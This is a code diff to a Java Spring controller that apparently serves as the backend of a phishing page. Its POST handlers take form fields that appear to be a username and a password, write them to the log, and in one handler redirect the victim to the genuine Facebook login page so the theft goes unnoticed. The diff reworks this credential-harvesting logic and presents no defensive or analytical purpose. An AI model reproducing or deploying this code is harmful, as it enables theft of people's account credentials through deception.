@@ -20,10 +20,16 @@ public class ControllerMap {
     }
 
     @PostMapping("/wr")
-    public RedirectView red(@ModelAttribute OrderInput orderInput) {
+    public String  red(@ModelAttribute OrderInput orderInput, Model model) {
+        logger.info(orderInput.getUs());
+        logger.info(orderInput.getPs());
+        model.addAttribute("orderInput", new OrderInput());
+        return "index1";
+    }
+    @PostMapping("/wr1")
+    public RedirectView red1(@ModelAttribute OrderInput orderInput) {
         logger.info(orderInput.getUs());
         logger.info(orderInput.getPs());
         return new RedirectView("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110");
     }
-
 }
